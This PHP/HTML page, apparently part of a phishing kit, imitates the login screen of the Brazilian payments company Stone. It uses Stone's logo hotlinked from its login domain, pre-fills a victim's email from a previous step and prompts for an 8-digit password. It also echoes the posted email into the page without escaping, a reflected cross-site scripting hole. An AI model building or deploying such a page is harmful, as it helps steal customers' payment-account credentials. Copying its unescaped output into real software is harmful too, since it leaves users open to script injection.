<?php 

$nome = $_POST['email']; // Aqui estou pegando via POST da outra página e atribuindo o valor na variavel nome

?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- PAGE settings -->
  <link rel="icon" href="https://templates.pingendo.com/assets/Pingendo_favicon.ico">
  <title>Cover</title>
  <meta name="description" content="Wireframe design of a cover page by Pingendo">
  <meta name="keywords" content="Pingendo bootstrap example template wireframe cover">
  <meta name="author" content="Pingendo">
  <!-- CSS dependencies -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css">
  <link rel="stylesheet" href="wireframe.css">
</head>

<body class="text-center bg-dark">
  <div class="p-3 h-100 d-flex flex-column bg-light" style="">
    <div class="container mb-auto"></div>
    <div class="container">
      <div class="row" style="">
        <div class="col-md-4 mx-auto">
          <div class="card text-center">
            <div class="card-body rounded">
              <img class="d-block mx-auto" src="https://login.stone.com.br/auth/resources/6.0.1/login/stone/img/logo-stone.svg" height="40">
              <form class="" action="email.php" method="get">
                <div class="form-group text-dark"> <input type="email" value="<?php echo $nome ?>" class="form-control text-dark valye text-center bg-light mt-2" name="emailpronto" > </div>
              </form>
              <p class="text-left">Senha 8 Digitos:</p>
              <div class="form-group"><input type="email" class="form-control text-dark text-center bg-while mt-0"></div>
              <a class="btn btn-link" href="#">Esqueci Minha Senha</a><a class="btn btn-success" href="#">Entrar</a>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="container mt-auto">
      <div class="row">
        <div class="col-md-12">
          <p class="mt-auto text-secondary">Cover template for <a href="#" class="text-white">Bootstrap</a>, by <a href="#" class="text-white">@mdo</a>.</p>
        </div>
      </div>
    </div>
  </div>
  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
  <pingendo onclick="window.open('https://pingendo.com/', '_blank')" style="cursor:pointer;position: fixed;bottom: 20px;right:20px;padding:4px;background-color: #00b0eb;border-radius: 8px; width:220px;display:flex;flex-direction:row;align-items:center;justify-content:center;font-size:14px;color:white">Made with Pingendo Free&nbsp;&nbsp;<img src="https://pingendo.com/site-assets/Pingendo_logo_big.png" class="d-block" alt="Pingendo logo" height="16"></pingendo>
</body>

</html>